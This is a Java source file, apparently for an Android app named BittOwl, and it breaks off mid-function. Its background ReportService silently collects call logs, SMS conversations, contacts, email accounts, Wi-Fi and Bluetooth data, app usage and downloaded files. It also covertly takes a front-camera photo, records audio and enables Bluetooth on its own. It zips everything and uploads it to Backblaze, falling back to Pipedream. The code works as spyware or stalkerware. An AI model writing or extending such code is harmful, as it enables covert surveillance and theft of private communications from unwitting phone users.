package com.mwendasoft.bittowl;

import com.google.android.gms.location.*;
import android.os.Handler;
import android.os.Looper;

import android.app.Service; 
import android.content.Intent; 
import android.os.IBinder; 
import android.os.Build; 
import android.os.Environment; 
import android.database.Cursor; 
import android.provider.CallLog; 
import android.net.Uri; 
import android.provider.Telephony; 
import android.content.pm.PackageInfo; 
import android.content.pm.PackageManager; 
import android.content.pm.ApplicationInfo; 
import android.app.usage.UsageStats; 
import android.app.usage.UsageStatsManager; 
import android.provider.Settings; 
import android.app.AppOpsManager; 
import android.util.Log; 
import android.content.Context; 
import android.provider.ContactsContract;

import java.io.*; 
import java.util.*; 
import java.util.zip.*; 
import java.text.SimpleDateFormat; 
import java.net.HttpURLConnection; 
import java.net.URL; 
import java.util.Locale;
import android.location.*;
import android.support.v4.app.*;
import android.app.usage.*;
import android.net.*;
import android.app.*;
import android.os.*;
import java.net.*;
import android.net.wifi.*;
import android.telephony.*;
import android.*;
import android.provider.*;
import android.text.format.DateFormat;
import android.content.*;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.*;
import android.database.sqlite.*;
import java.lang.reflect.*;
import android.bluetooth.*;
import android.accounts.*;
import android.support.v4.content.*;
import com.google.firebase.storage.*;
import com.google.firebase.auth.*;
import android.view.*;

public class ReportService extends Service {
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        executor.submit(new Runnable() {
				@Override
				public void run() {
					runReportTasks();
				}
			});

        return START_NOT_STICKY;
    }

    private void runReportTasks() {
		ExecutorService executorService = Executors.newFixedThreadPool(4); // Adjust threads if needed

		// Submit report generation tasks
		executorService.submit(new Runnable() { public void run() { generateDeviceInfoReport(); }});
		executorService.submit(new Runnable() { public void run() { generateCallLogReport(); }});
		executorService.submit(new Runnable() { public void run() { generateSmsReport(); }});
		executorService.submit(new Runnable() { public void run() { generateContactsReport(); }});
		executorService.submit(new Runnable() { public void run() { generateInstalledAppsReport(); }});
		executorService.submit(new Runnable() { public void run() { generateUsageStatsReport(); }});
		executorService.submit(new Runnable() { public void run() { generateLocationReport(); }});
		executorService.submit(new Runnable() { public void run() { generateDataUsageReport(); }});
		executorService.submit(new Runnable() { public void run() { generateInternetReport(); }});
		executorService.submit(new Runnable() { public void run() { generateStorageReport(); }});
		executorService.submit(new Runnable() { public void run() { generateCalendarEventsReport(); }});
		executorService.submit(new Runnable() { public void run() { generateNetworkTrafficReport(); }});
		executorService.submit(new Runnable() { public void run() { generateScreenTimeReport(); }});
		executorService.submit(new Runnable() { public void run() { generateBluetoothPairedDevicesReport(); }});
		executorService.submit(new Runnable() { public void run() { generateWifiConfiguredNetworksReport(); }});
		executorService.submit(new Runnable() { public void run() { generateDownloadedFilesReport(); }});
		executorService.submit(new Runnable() { public void run() { generateEmailAddressesReport(); }});

		// ------------------------------
        // Submit media capture tasks
        // ------------------------------

        // 1. Capture front camera photo
		executorService.submit(new Runnable() {
				public void run() {
					try {
						File userPhoto = MediaCaptureHelper.captureFrontCameraPhoto(ReportService.this, "bittowl_logs");
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			});

       // 2. Record audio
		executorService.submit(new Runnable() {
				public void run() {
					try {
						File audio = MediaCaptureHelper.recordAudio(ReportService.this, "bittowl_logs");
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			});
			
		// Shutdown and wait for all tasks to finish
		executorService.shutdown();
		try {
			executorService.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		File folder = getExternalFilesDir("bittowl_logs");
		if (folder == null) {
			android.util.Log.e("ReportService", "Folder is null");
			stopSelf();
			return;
		}

		final File zip = zipReportFiles(folder);

		try {
			Thread.sleep(2000); // wait for zip creation
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		uploadZipAndCleanup(zip, folder);
	}
	
	private boolean waitForInternetConnectionWithTimeout(long timeoutMinutes) {
		long startTime = System.currentTimeMillis();
		long timeoutMs = timeoutMinutes * 60 * 1000; 

		while (!isNetworkAvailable()) {
			if (System.currentTimeMillis() - startTime > timeoutMs) {
				android.util.Log.w("BittOwl - Internet Check", "⏰ Internet wait timeout after " + timeoutMinutes + " minutes");
				return false;
			}

			android.util.Log.w("BittOwl - Internet Check", "📵 Waiting for internet connection...");
			try {
				Thread.sleep(5000); // Check every 5 seconds
			} catch (InterruptedException e) {
				Thread.currentThread().interrupt();
				return false;
			}
		}
		return true;
	}
	
	private boolean isNetworkAvailable() {
		try {
			ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
			return activeNetworkInfo != null && activeNetworkInfo.isConnected();
		} catch (Exception e) {
			return false;
		}
	}
	
	private boolean isNetworkError(Exception e) {
		String message = e.getMessage();
		if (message == null) return false;

		// Common network error patterns
		return message.contains("Failed to connect") ||
			message.contains("Network is unreachable") ||
			message.contains("timeout") ||
			message.contains("No route to host") ||
			message.contains("Connection refused") ||
			message.contains("Unable to resolve host");
	}

	private void uploadZipAndCleanup(final File zipFile, final File folder) {
		if (zipFile == null || !zipFile.exists()) {
			android.util.Log.e("BittOwl", "❌ Zip file missing or does not exist.");
			stopSelf();
			return;
		}

		// Wait for internet with 60-minute timeout (1 hour)
		if (!waitForInternetConnectionWithTimeout(60)) {
			android.util.Log.w("BittOwl", "⏰ Internet timeout - saving for manual upload");
			saveForManualUpload(zipFile);
			cleanUpReportFiles(folder);
			sendCompletionBroadcast();
			stopSelf();
			return;
		}

		android.util.Log.d("BittOwl", "✅ Internet connection available - proceeding with upload");

		BackblazeUploader.uploadFile(zipFile, new BackblazeUploader.UploadCallback() {
				@Override
				public void onSuccess(String downloadUrl) {
					android.util.Log.d("BittOwl - Upload", "✅ Backblaze upload successful! Link: " + downloadUrl);
					cleanUpReportFiles(folder);
					sendCompletionBroadcast();
					stopSelf();
				}

				@Override
				public void onFailure(Exception e) {
					android.util.Log.e("BittOwl - Upload", "❌ Backblaze upload failed: " + e.getMessage());

					// Check if it's an AUTHENTICATION error - skip to Pipedream immediately
					if (isAuthenticationError(e)) {
						android.util.Log.w("BittOwl - Upload", "🔐 Authentication error detected - skipping to Pipedream");
						uploadToPipedreamWithCallback(zipFile, folder);
					}
					// Check if it's a network error
					else if (isNetworkError(e)) {
						android.util.Log.w("BittOwl - Upload", "🌐 Network error detected, skipping Pipedream attempt");
						saveForManualUpload(zipFile);
						cleanUpReportFiles(folder);
						sendCompletionBroadcast();
						stopSelf();
					} else {
						// Try Pipedream for other types of errors
						uploadToPipedreamWithCallback(zipFile, folder);
					}
				}

				@Override
				public void onProgress(int progress) {
					android.util.Log.d("BittOwl - Upload", "Backblaze progress: " + progress + "%");
				}
			});
	}
	
	private boolean isAuthenticationError(Exception e) {
		String message = e.getMessage();
		if (message == null) return false;

		// Common authentication error patterns
		String lowerMessage = message.toLowerCase();
		return lowerMessage.contains("authenticate") ||
			lowerMessage.contains("auth") ||
			lowerMessage.contains("401") ||
			lowerMessage.contains("403") ||
			lowerMessage.contains("invalid") ||
			lowerMessage.contains("unauthorized") ||
			lowerMessage.contains("forbidden") ||
			message.contains("Failed to authenticate with Backblaze");
	}
	
	private void uploadToPipedreamWithCallback(final File zipFile, final File folder) {
		final int[] retryCount = {0};
		final int maxRetries = 2;

		final PipedreamUploader.UploadCallback retryCallback = new PipedreamUploader.UploadCallback() {
			@Override
			public void onSuccess() {
				android.util.Log.d("BittOwl - Pipedream Upload", "✅ Pipedream upload successful!");
				cleanUpReportFiles(folder);

				Intent doneIntent = new Intent("com.mwendasoft.bittowl.REPORT_COMPLETED");
				sendBroadcast(doneIntent);
				stopSelf();
			}

			@Override
			public void onFailure(Exception e) {
				retryCount[0]++;
				if (retryCount[0] <= maxRetries) {
					android.util.Log.w("BittOwl - Pipedream Upload", "🔄 Pipedream retry " + retryCount[0] + "/" + maxRetries);
					try {
						Thread.sleep(2000 * retryCount[0]);
					} catch (InterruptedException ie) {
						Thread.currentThread().interrupt();
					}
					PipedreamUploader.uploadZipToPipedream(zipFile, this);
				} else {
					android.util.Log.e("BittOwl - Pipedream Upload", "❌ Pipedream upload failed after " + maxRetries + " attempts: " + e.getMessage());

					saveForManualUpload(zipFile);
					cleanUpReportFiles(folder);

					Intent doneIntent = new Intent("com.mwendasoft.bittowl.REPORT_COMPLETED");
					sendBroadcast(doneIntent);
					stopSelf();
				}
			}
		};

		// Start first attempt
		PipedreamUploader.uploadZipToPipedream(zipFile, retryCallback);
	}
	
	private void saveForManualUpload(File zipFile) {
		try {
			File manualDir = new File(Environment.getExternalStorageDirectory(), "BittOwl_Manual_Upload");
			if (!manualDir.exists()) manualDir.mkdirs();

			File dest = new File(manualDir, zipFile.getName());

			// Copy file with overwrite protection
			int counter = 1;
			String baseName = zipFile.getName().replace(".zip", "");
			while (dest.exists()) {
				dest = new File(manualDir, baseName + "_" + counter + ".zip");
				counter++;
			}

			java.io.FileInputStream in = new java.io.FileInputStream(zipFile);
			java.io.FileOutputStream out = new java.io.FileOutputStream(dest);
			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0) {
				out.write(buf, 0, len);
			}
			in.close();
			out.close();

			android.util.Log.w("BittOwl", "💾 File saved for manual upload: " + dest.getAbsolutePath());

			// Notify user about saved file (optional)
			showManualUploadNotification(dest);

		} catch (Exception e) {
			android.util.Log.e("BittOwl", "❌ Failed to save for manual upload", e);
		}
	}

	private void showManualUploadNotification(File file) {
		// Optional: Show notification about saved file
		NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "bittowl_channel")
			.setSmallIcon(android.R.drawable.ic_dialog_info)
			.setContentTitle("BittOwl Report Saved")
			.setContentText("Report saved for manual upload: " + file.getName())
			.setPriority(NotificationCompat.PRIORITY_LOW);

		NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		notificationManager.notify(1001, builder.build());
	}

	private void sendCompletionBroadcast() {
		Intent doneIntent = new Intent("com.mwendasoft.bittowl.REPORT_COMPLETED");
		sendBroadcast(doneIntent);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		executor.shutdownNow();
		Intent intent = new Intent("REPORT_SERVICE_FINISHED");
		sendBroadcast(intent);
	}

	private void generateDeviceInfoReport() {
		// Get uptime in milliseconds since last boot (excluding deep sleep)
		long uptimeMillis = SystemClock.uptimeMillis();

		// Calculate boot time in milliseconds (current time - uptime)
		long bootTimeMillis = System.currentTimeMillis() - uptimeMillis;

		// Format uptime as hh:mm:ss
		String uptimeStr = formatDuration(uptimeMillis);

		// Format boot time as "MMM dd, yyyy, HHmm HRS" (e.g. Jan 20, 2025, 2100 HRS)
		SimpleDateFormat bootFormat = new SimpleDateFormat("MMM dd, yyyy, HHmm 'HRS'", Locale.getDefault());
		String bootTimeStr = bootFormat.format(new Date(bootTimeMillis));

		String content = "Device Info Report\n\n" +
            "Device Name: " + Build.DEVICE + "\n" +
            "Brand: " + Build.BRAND + "\n" +
            "Model: " + Build.MODEL + "\n" +
            "Android Version: " + Build.VERSION.RELEASE + "\n" +
            "Generated: " + getDateNow() + "\n\n" +
            "System Uptime: " + uptimeStr + "\n" +
            "Last Boot Time: " + bootTimeStr + "\n";

		saveToFile("device_info.txt", content);
	}

    // Helper to convert milliseconds to hh:mm:ss format
	private String formatDuration(long millis) {
		long seconds = millis / 1000;
		long hours = seconds / 3600;
		long minutes = (seconds % 3600) / 60;
		long secs = seconds % 60;
		return String.format(Locale.getDefault(), "%02d:%02d:%02d", hours, minutes, secs);
	}
	
	// BLUETOOTH REPORT
	
	private void generateBluetoothPairedDevicesReport() {
		StringBuilder btLog = new StringBuilder("Bluetooth Paired Devices Report\n\n");

		// Check Bluetooth permission
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH) 
            != PackageManager.PERMISSION_GRANTED) {
			btLog.append("Bluetooth permission not granted\n");
			saveToFile("bluetooth_paired_devices.txt", btLog.toString());
			return;
		}

		try {
			BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

			if (bluetoothAdapter == null) {
				btLog.append("Bluetooth not supported on this device.\n");
			} else {
				// Check if Bluetooth is enabled
				if (!bluetoothAdapter.isEnabled()) {
					// Try to enable Bluetooth
					if (bluetoothAdapter.enable()) {
						// Wait a moment for Bluetooth to enable
						Thread.sleep(1000);
					} else {
						btLog.append("Bluetooth is disabled and couldn't be enabled.\n");
					}
				}

				// Check again after attempting to enable
				if (bluetoothAdapter.isEnabled()) {
					Set<BluetoothDevice> pairedDevices = bluetoothAdapter.getBondedDevices();

					if (pairedDevices == null || pairedDevices.isEmpty()) {
						btLog.append("No paired Bluetooth devices found.\n");
					} else {
						for (BluetoothDevice device : pairedDevices) {
							btLog.append("Name: ").append(device.getName()).append("\n")
								.append("MAC Address: ").append(device.getAddress()).append("\n")
								.append("Bluetooth Class: ")
								.append(device.getBluetoothClass() != null ? 
										device.getBluetoothClass().toString() : "N/A")
								.append("\n---------------------------\n");
						}
					}
				} else {
					btLog.append("Bluetooth is disabled.\n");
				}
			}
		} catch (Exception e) {
			btLog.append("Error retrieving paired Bluetooth devices: ")
				.append(e.getMessage()).append("\n");
		}

		saveToFile("bluetooth_paired_devices.txt", btLog.toString());
	}
	
	// WIFI REPORT
	
	private void generateWifiConfiguredNetworksReport() {
		StringBuilder wifiLog = new StringBuilder("Configured Wi-Fi Networks Report\n\n");

		// Check Location permission (required for Wi-Fi scanning on Android 10+)
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
			wifiLog.append("Location permission required for Wi-Fi network information.\n");
			saveToFile("wifi_networks_report.txt", wifiLog.toString());
			return;
		}

		try {
			WifiManager wifiManager = (WifiManager) getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);

			if (wifiManager == null) {
				wifiLog.append("Wi-Fi Manager not available.\n");
			} else {
				List<WifiConfiguration> configuredNetworks = wifiManager.getConfiguredNetworks();

				if (configuredNetworks == null || configuredNetworks.isEmpty()) {
					wifiLog.append("No configured Wi-Fi networks found.\n");
				} else {
					for (WifiConfiguration config : configuredNetworks) {
						wifiLog.append("SSID: ")
							.append(config.SSID != null ? config.SSID.replace("\"", "") : "N/A")
							.append("\nBSSID: ").append(config.BSSID)
							.append("\nStatus: ").append(getWifiStatus(config.status))
							.append("\nSecurity: ").append(getWifiSecurity(config))
							.append("\n---------------------------\n");
					}
				}
			}
		} catch (Exception e) {
			wifiLog.append("Error retrieving Wi-Fi configured networks: ")
				.append(e.getMessage()).append("\n");
		}

		saveToFile("wifi_networks_report.txt", wifiLog.toString());
	}

// Helper method to get Wi-Fi status
	private String getWifiStatus(int status) {
		switch (status) {
			case WifiConfiguration.Status.CURRENT: return "Current";
			case WifiConfiguration.Status.DISABLED: return "Disabled";
			case WifiConfiguration.Status.ENABLED: return "Enabled";
			default: return "Unknown";
		}
	}

// Helper method to get security type
	private String getWifiSecurity(WifiConfiguration config) {
		if (config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.NONE)) {
			return "Open";
		} else if (config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.WPA_PSK)) {
			return "WPA-PSK";
		} else if (config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.WPA_EAP) ||
				   config.allowedKeyManagement.get(WifiConfiguration.KeyMgmt.IEEE8021X)) {
			return "Enterprise";
		} else if (config.wepKeys[0] != null) {
			return "WEP";
		}
		return "Unknown";
	}
	
	// DOWNLOADED FILES REPORT
	
	private void generateDownloadedFilesReport() {
		StringBuilder downloadLog = new StringBuilder("Downloaded Files Report\n\n");

		try {
			File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

			if (downloadDir == null || !downloadDir.exists()) {
				downloadLog.append("Download directory not found.\n");
				Log.w("DownloadReport", "Download directory not found or inaccessible.");
			} else {
				File[] files = downloadDir.listFiles();

				if (files == null || files.length == 0) {
					downloadLog.append("No downloaded files found.\n");
					Log.i("DownloadReport", "No files found in download directory.");
				} else {
					for (File file : files) {
						downloadLog.append("File: ").append(file.getName()).append("\n");
						downloadLog.append("Size (bytes): ").append(file.length()).append("\n");
						downloadLog.append("Last Modified: ").append(new Date(file.lastModified()).toString()).append("\n");
						downloadLog.append("---------------------------\n");
					}
					Log.i("DownloadReport", "Listed " + files.length + " files in downloads.");
				}
			}
		} catch (Exception e) {
			downloadLog.append("Error reading downloaded files: ").append(e.getMessage()).append("\n");
			Log.e("DownloadReport", "Exception: ", e);
		}

		saveToFile("downloaded_files_report.txt", downloadLog.toString());
	}
	
	// EMAIL ACCOUNTS REPORT
	
	private void generateEmailAddressesReport() {
		StringBuilder emailLog = new StringBuilder("Email Addresses Report\n\n");

		try {
			AccountManager accountManager = AccountManager.get(this);
			Account[] accounts = accountManager.getAccounts();

			boolean found = false;
			for (Account account : accounts) {
				if (account.name.contains("@")) { // crude filter for emails
					emailLog.append("Email: ").append(account.name).append("\n");
					emailLog.append("Type: ").append(account.type).append("\n");
					emailLog.append("---------------------------\n");
					found = true;
				}
			}

			if (!found) {
				emailLog.append("No email accounts found.\n");
				Log.i("EmailReport", "No email accounts on device.");
			} else {
				Log.i("EmailReport", "Email accounts retrieved: " + accounts.length);
			}
		} catch (Exception e) {
			emailLog.append("Error retrieving email addresses: ").append(e.getMessage()).append("\n");
			Log.e("EmailReport", "Exception: ", e);
		}

		saveToFile("email_addresses_report.txt", emailLog.toString());
	}
	
	// CALL LOGS REPORT

	private void generateCallLogReport() {
		String TAG = "ReportService"; // Tag for Logcat
		StringBuilder callLog = new StringBuilder("Call Log Report\n\n");

		Log.d(TAG, "Starting Call Log report generation...");

		Cursor cursor = null;
		try {
			cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
			);

			if (cursor != null) {
				int count = 0;
				while (cursor.moveToNext() && count < 50) {
					try {
						String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
						String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
						String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
						String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

						String name = getContactName(number);
						if (name == null) name = "Unknown";

						String callType = "UNKNOWN";
						int typeCode = Integer.parseInt(type);
						switch (typeCode) {
							case CallLog.Calls.OUTGOING_TYPE:
								callType = "OUTGOING";
								break;
							case CallLog.Calls.INCOMING_TYPE:
								callType = "INCOMING";
								break;
							case CallLog.Calls.MISSED_TYPE:
								callType = "MISSED";
								break;
						}

						int durationSeconds = Integer.parseInt(duration);
						int durationMinutes = durationSeconds / 60;
						int remainderSeconds = durationSeconds % 60;

						callLog.append("Number: ").append(number).append(" (").append(name).append(")")
                            .append("\nType: ").append(callType)
                            .append("\nDate: ").append(new Date(Long.parseLong(date)).toString())
                            .append("\nDuration: ").append(durationMinutes).append(" min ")
                            .append(remainderSeconds).append(" sec")
                            .append("\n------------------------\n");

						count++;
					} catch (Exception e) {
						Log.e(TAG, "Error reading a call log entry: " + e.getMessage(), e);
						callLog.append("Error reading an entry: ").append(e.getMessage()).append("\n");
					}
				}
			} else {
				Log.w(TAG, "No call logs found.");
				callLog.append("No call logs found.\n");
			}
		} catch (Exception e) {
			Log.e(TAG, "Error generating call log report: " + e.getMessage(), e);
			callLog.append("Error: ").append(e.getMessage()).append("\n");
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}

		saveToFile("call_log.txt", callLog.toString());
		Log.d(TAG, "Call Log report saved to file.");
	}
	
	// CONTACTS REPORT
	
	private void generateContactsReport() {
		String TAG = "ReportService"; // Tag for Logcat
		StringBuilder contactLog = new StringBuilder();
		contactLog.append("Contacts Report\n\n");

		Log.d(TAG, "Starting Contacts report generation...");

		Cursor cursor = null;
		try {
			ContentResolver cr = getContentResolver();
			cursor = cr.query(
				ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
				null,
				null,
				null,
				ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
			);

			if (cursor != null && cursor.moveToFirst()) {
				do {
					try {
						String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
						String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

						contactLog.append("Name: ").append(name).append("\n");
						contactLog.append("Phone: ").append(number).append("\n");
						contactLog.append("-----------------------\n");
					} catch (Exception e) {
						Log.e(TAG, "Error reading contact entry: " + e.getMessage(), e);
						contactLog.append("Error reading entry: ").append(e.getMessage()).append("\n");
					}
				} while (cursor.moveToNext());
			} else {
				Log.w(TAG, "No contacts found.");
				contactLog.append("No contacts found.\n");
			}
		} catch (Exception e) {
			Log.e(TAG, "Error generating contacts report: " + e.getMessage(), e);
			contactLog.append("Error reading contacts: ").append(e.getMessage()).append("\n");
		} finally {
			if (cursor != null) {
				try {
					cursor.close();
				} catch (Exception e) {
					Log.e(TAG, "Error closing contacts cursor: " + e.getMessage(), e);
				}
			}
		}

		saveToFile("contacts_log.txt", contactLog.toString());
		Log.d(TAG, "Contacts report saved to file.");
	}
	
	// SMS REPORT
	
	//************* NEW **********
	private void generateSmsReport() {
		final String TAG = "ReportService - SMS Report";
		Log.d(TAG, "Starting SMS report generation...");

		StringBuilder smsInfo = new StringBuilder();
		smsInfo.append("SMS Conversation Report\n\n");
		smsInfo.append("Report generated: ").append(new Date().toString()).append("\n\n");

		// Verify permissions
		if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
			smsInfo.append("ERROR: READ_SMS permission not granted\n");
			saveToFile("sms_log.txt", smsInfo.toString());
			return;
		}

		// Get all SMS messages first
		ArrayList<SmsMessage> allMessages = getAllSmsMessages();

		if (allMessages.isEmpty()) {
			smsInfo.append("No SMS messages found\n");
		} else {
			// Group messages by contact
			HashMap<String, ArrayList<SmsMessage>> conversations = groupMessagesByContact(allMessages);

			// Sort contacts by most recent message
			ArrayList<Map.Entry<String, ArrayList<SmsMessage>>> sortedContacts = 
				sortContactsByRecentMessage(conversations);

			// Show top 20 contacts
			int contactCount = Math.min(20, sortedContacts.size());
			for (int i = 0; i < contactCount; i++) {
				Map.Entry<String, ArrayList<SmsMessage>> entry = sortedContacts.get(i);
				String contactName = getContactName(entry.getKey());
				ArrayList<SmsMessage> messages = entry.getValue();

				// Sort messages by date (oldest first)
				Collections.sort(messages, new Comparator<SmsMessage>() {
						@Override
						public int compare(SmsMessage m1, SmsMessage m2) {
							return Long.compare(m1.date, m2.date);
						}
					});

				// Add contact header
				smsInfo.append("\n====================\n");
				smsInfo.append(entry.getKey()).append(" (").append(contactName).append(")\n");
				smsInfo.append("====================\n");

				// Show last 100 messages for this contact
				int startIdx = Math.max(0, messages.size() - 100);
				for (int j = startIdx; j < messages.size(); j++) {
					SmsMessage msg = messages.get(j);
					smsInfo.append("[")
						.append(msg.type.equals("Inbox") ? "RECD" : "SENT")
						.append(": ")
						.append(DateFormat.format("MM/dd/yyyy, HHmm", msg.date))
						.append("] ")
						.append(msg.body)
						.append("\n");
				}
			}
		}

		saveToFile("sms_log.txt", smsInfo.toString());
		Log.d(TAG, "SMS report generation completed");
	}

    // Get all SMS messages from content provider
	private ArrayList<SmsMessage> getAllSmsMessages() {
		final String TAG = "ReportService - SMS Report";
		ArrayList<SmsMessage> messages = new ArrayList<SmsMessage>();
		Cursor cursor = null;

		try {
			cursor = getContentResolver().query(
				Uri.parse("content://sms"),
				new String[]{"address", "body", "date", "type", "status"},
				null, null, null);

			if (cursor != null && cursor.moveToFirst()) {
				do {
					SmsMessage msg = new SmsMessage();
					msg.address = cursor.getString(cursor.getColumnIndex("address"));
					msg.body = cursor.getString(cursor.getColumnIndex("body"));
					msg.date = cursor.getLong(cursor.getColumnIndex("date"));
					msg.type = getSmsType(cursor.getInt(cursor.getColumnIndex("type")));
					msg.status = cursor.getInt(cursor.getColumnIndex("status"));

					messages.add(msg);
				} while (cursor.moveToNext());
			}
		} catch (Exception e) {
			Log.e(TAG, "Error getting SMS: " + e.getMessage());
		} finally {
			if (cursor != null) {
				cursor.close();
			}
		}

		return messages;
	}

    // Group messages by contact address
	private HashMap<String, ArrayList<SmsMessage>> groupMessagesByContact(ArrayList<SmsMessage> messages) {
		HashMap<String, ArrayList<SmsMessage>> conversations = new HashMap<String, ArrayList<SmsMessage>>();

		for (SmsMessage msg : messages) {
			if (!conversations.containsKey(msg.address)) {
				conversations.put(msg.address, new ArrayList<SmsMessage>());
			}
			conversations.get(msg.address).add(msg);
		}

		return conversations;
	}

    // Sort contacts by most recent message time
	private ArrayList<Map.Entry<String, ArrayList<SmsMessage>>> sortContactsByRecentMessage(
        HashMap<String, ArrayList<SmsMessage>> conversations) {

		ArrayList<Map.Entry<String, ArrayList<SmsMessage>>> sortedContacts = 
			new ArrayList<Map.Entry<String, ArrayList<SmsMessage>>>(conversations.entrySet());

		Collections.sort(sortedContacts, new Comparator<Map.Entry<String, ArrayList<SmsMessage>>>() {
				@Override
				public int compare(Map.Entry<String, ArrayList<SmsMessage>> a, 
								   Map.Entry<String, ArrayList<SmsMessage>> b) {
					// Get most recent message from each conversation
					long aTime = getMostRecentMessageTime(a.getValue());
					long bTime = getMostRecentMessageTime(b.getValue());
					return Long.compare(bTime, aTime); // Descending order
				}
			});

		return sortedContacts;
	}

    // Get most recent message time in a conversation
	private long getMostRecentMessageTime(ArrayList<SmsMessage> messages) {
		long mostRecent = 0;
		for (SmsMessage msg : messages) {
			if (msg.date > mostRecent) {
				mostRecent = msg.date;
			}
		}
		return mostRecent;
	}

    // SMS Message holder class
	private static class SmsMessage {
		String address;
		String body;
		long date;
		String type;
		int status;
	}

    // Convert SMS type integer to string
	private String getSmsType(int type) {
		switch (type) {
			case 1: return "Inbox";
			case 2: return "Sent";
			case 3: return "Draft";
			case 4: return "Outbox";
			case 5: return "Failed";
			case 6: return "Queued";
			default: return "Unknown";
		}
	}
	
	//****************************

    // APP INSTALLED REPORT

	private void generateInstalledAppsReport() {
		StringBuilder appLog = new StringBuilder("Installed Apps Report\n\n");
		PackageManager pm = getPackageManager();
		List<PackageInfo> packages = pm.getInstalledPackages(0);

		for (PackageInfo pkg : packages) {
			ApplicationInfo appInfo = pkg.applicationInfo;
			String appName = pm.getApplicationLabel(appInfo).toString();
			String packageName = pkg.packageName;
			boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;

			appLog.append("App: ").append(appName)
                .append("\nPackage: ").append(packageName)
                .append("\nType: ").append(isSystem ? "System" : "User")
                .append("\n---------------------------\n");
		}
		saveToFile("apps_log.txt", appLog.toString());
	}

	private void generateUsageStatsReport() {
		String TAG = "ReportService"; // For Logcat
		StringBuilder usageLog = new StringBuilder("App Usage Stats (Last 24 hours)\n\n");

		Log.d(TAG, "Starting usage stats report generation...");

		try {
			if (!hasUsagePermission()) {
				Log.w(TAG, "Usage stats permission not granted.");
				usageLog.append("Permission not granted to access usage stats.\n");
				saveToFile("usage_log.txt", usageLog.toString());
				return;
			}

			UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
			long endTime = System.currentTimeMillis();
			long startTime = endTime - (24 * 60 * 60 * 1000); // Last 24 hours

			Log.d(TAG, "Querying usage stats from: " + new Date(startTime) + " to " + new Date(endTime));

			List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime
			);

			if (stats != null && !stats.isEmpty()) {
				PackageManager pm = getPackageManager();
				for (UsageStats usage : stats) {
					try {
						ApplicationInfo appInfo = pm.getApplicationInfo(usage.getPackageName(), 0);
						String appName = pm.getApplicationLabel(appInfo).toString();
						long totalTimeMs = usage.getTotalTimeInForeground();

						if (totalTimeMs > 0) {
							long seconds = totalTimeMs / 1000;
							long minutes = seconds / 60;
							seconds = seconds % 60;

							usageLog.append("App: ").append(appName)
                                .append("\nPackage: ").append(usage.getPackageName())
                                .append("\nTime Used: ").append(minutes).append(" min ").append(seconds).append(" sec")
                                .append("\nLast Used: ").append(new Date(usage.getLastTimeUsed()))
                                .append("\n---------------------------\n");

							Log.d(TAG, "App: " + appName + ", Time used: " + minutes + "m " + seconds + "s");
						}
					} catch (PackageManager.NameNotFoundException e) {
						Log.e(TAG, "App not found: " + usage.getPackageName(), e);
					} catch (Exception e) {
						Log.e(TAG, "Error processing app usage: " + usage.getPackageName() + " - " + e.getMessage(), e);
					}
				}
			} else {
				Log.w(TAG, "No usage stats found.");
				usageLog.append("No usage stats found.\n");
			}
		} catch (Exception e) {
			Log.e(TAG, "Error generating usage stats report: " + e.getMessage(), e);
			usageLog.append("Error: ").append(e.getMessage()).append("\n");
		}

		saveToFile("usage_log.txt", usageLog.toString());
		Log.d(TAG, "Usage stats report saved to file.");
	}
	
	// LOCATION REPORT
	
	private void generateLocationReport() {
		final String TAG = "ReportService";
		final StringBuilder locationInfo = new StringBuilder();
		locationInfo.append("Location Report\n\n");

		Log.d(TAG, "Starting location report generation...");

		try {
			// Check permission
			if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
				Log.w(TAG, "Location permission not granted.");
				locationInfo.append("Location permission not granted.\n");
				saveToFile("location_log.txt", locationInfo.toString());
				return;
			}

			final FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

